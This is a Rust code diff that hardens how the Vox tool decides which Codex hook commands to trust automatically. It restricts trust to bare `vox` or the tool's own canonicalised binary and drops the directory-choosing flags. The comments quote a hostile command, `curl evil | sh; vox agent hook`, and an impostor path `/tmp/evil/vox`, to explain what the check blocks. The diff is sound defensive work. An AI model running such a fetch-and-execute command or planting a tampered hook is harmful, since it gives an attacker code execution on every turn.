@@ -17,7 +17,8 @@
 //!
 //! **Only Vox's own entries are trusted, and "own" is exact.** A command qualifies only
 //! if it is, token for token, what `vox agent plugin codex` emits — `vox agent hook`,
-//! optionally with `vox agent hook`'s own flags and values of plain characters — with no
+//! or the absolute path of this very binary, optionally with `--room`/`--session`/
+//! `--profile`/`--format` and values of plain characters — with no
 //! shell metacharacter anywhere ([`is_vox_hook`]). Codex runs a hook's command through a
 //! shell, so a substring match would trust `curl evil | sh; vox agent hook`: trusting a
 //! command is authorising it to run on every turn. Another tool's hook is that tool's
@@ -124,38 +125,47 @@ impl Drop for AppServer {
     }
 }
 
-/// Whether `command` is exactly Vox's drain hook: `vox` (or an absolute path to a file
-/// named `vox`), then `agent hook`, then only `vox agent hook`'s own flags, each with a
-/// value of plain characters — and nothing a shell would interpret.
+/// Whether `command` is exactly Vox's drain hook: bare `vox`, or the absolute path of
+/// **this** `vox` (`this_exe`, canonicalised), then `agent hook`, then only `--room`,
+/// `--session`, `--profile` (plain values) and `--format` — and nothing a shell would
+/// interpret.
+///
+/// Two things are deliberately refused though `vox agent hook` accepts them:
+/// - **any other absolute path**, even one ending in `/vox`: `/tmp/evil/vox agent hook`
+///   is a different program, and a trusted entry tampered to point at it would
+///   otherwise be re-trusted silently;
+/// - **`--data-dir` and `--config-dir`**: they choose which profile's rooms land in the
+///   agent's context, so a tampered entry could aim the hook at an attacker's profile.
+///   `vox agent plugin codex` never emits them; `--profile` selects a profile within the
+///   operator's own directories.
 #[must_use]
-pub fn is_vox_hook(command: &str) -> bool {
-    let plain = |v: &str, extra: &[char]| {
+pub fn is_vox_hook(command: &str, this_exe: Option<&std::path::Path>) -> bool {
+    let plain = |v: &str| {
         !v.is_empty()
             && v.len() <= 256
-            && v.chars().all(|c| {
-                c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') || extra.contains(&c)
-            })
+            && v.chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
     };
     let tokens: Vec<&str> = command.split(' ').collect();
     let [exe, "agent", "hook", flags @ ..] = tokens.as_slice() else {
         return false;
     };
-    let exe_ok =
-        *exe == "vox" || (exe.starts_with('/') && exe.ends_with("/vox") && plain(exe, &['/']));
+    let exe_ok = *exe == "vox"
+        || (exe.starts_with('/')
+            && this_exe.is_some_and(|me| std::fs::canonicalize(exe).is_ok_and(|p| p == me)));
     if !exe_ok || flags.len() % 2 != 0 {
         return false;
     }
     flags.chunks(2).all(|pair| match pair {
-        ["--room" | "--session" | "--profile", v] => plain(v, &[]),
+        ["--room" | "--session" | "--profile", v] => plain(v),
         ["--format", v] => matches!(*v, "auto" | "claude" | "text"),
-        ["--data-dir" | "--config-dir", v] => v.starts_with('/') && plain(v, &['/']),
         _ => false,
     })
 }
 
 /// Vox's hook entries in a `hooks/list` result: `(key, currentHash, trusted, command)`,
 /// once each.
-fn ours(listed: &Value) -> Vec<(String, String, bool, String)> {
+fn ours(listed: &Value, this_exe: Option<&std::path::Path>) -> Vec<(String, String, bool, String)> {
     let mut out: Vec<(String, String, bool, String)> = Vec::new();
     for h in listed["data"]
         .as_array()
@@ -164,7 +174,7 @@ fn ours(listed: &Value) -> Vec<(String, String, bool, String)> {
         .flat_map(|d| d["hooks"].as_array().into_iter().flatten())
     {
         let command = h["command"].as_str().unwrap_or_default();
-        if !is_vox_hook(command) {
+        if !is_vox_hook(command, this_exe) {
             continue;
         }
         let (Some(key), Some(hash)) = (h["key"].as_str(), h["currentHash"].as_str()) else {
@@ -190,13 +200,15 @@ fn ours(listed: &Value) -> Vec<(String, String, bool, String)> {
 /// If the app-server cannot be started or answers with an error, or if an entry still
 /// reads untrusted after the write.
 pub fn trust(codex: &str) -> Result<Report, String> {
+    // The one absolute path that is Vox's: this very binary, canonicalised.
+    let this_exe = std::env::current_exe().and_then(std::fs::canonicalize).ok();
     let mut app = AppServer::start(codex)?;
     app.call(
         "initialize",
         json!({"clientInfo": {"name": "vox", "version": env!("CARGO_PKG_VERSION")}}),
     )?;
     app.send(&json!({"jsonrpc": "2.0", "method": "initialized"}))?;
-    let listed = ours(&app.call("hooks/list", json!({}))?);
+    let listed = ours(&app.call("hooks/list", json!({}))?, this_exe.as_deref());
     let edits: Vec<Value> = listed
         .iter()
         .filter(|(_, _, trusted, _)| !trusted)
@@ -223,7 +235,7 @@ pub fn trust(codex: &str) -> Result<Report, String> {
         return Ok(report);
     }
     app.call("config/batchWrite", json!({ "edits": edits }))?;
-    let after = ours(&app.call("hooks/list", json!({}))?);
+    let after = ours(&app.call("hooks/list", json!({}))?, this_exe.as_deref());
     if let Some((key, _, _, _)) = after.iter().find(|(_, _, trusted, _)| !trusted) {
         return Err(format!(
             "Codex still reports {key} as untrusted after the write"
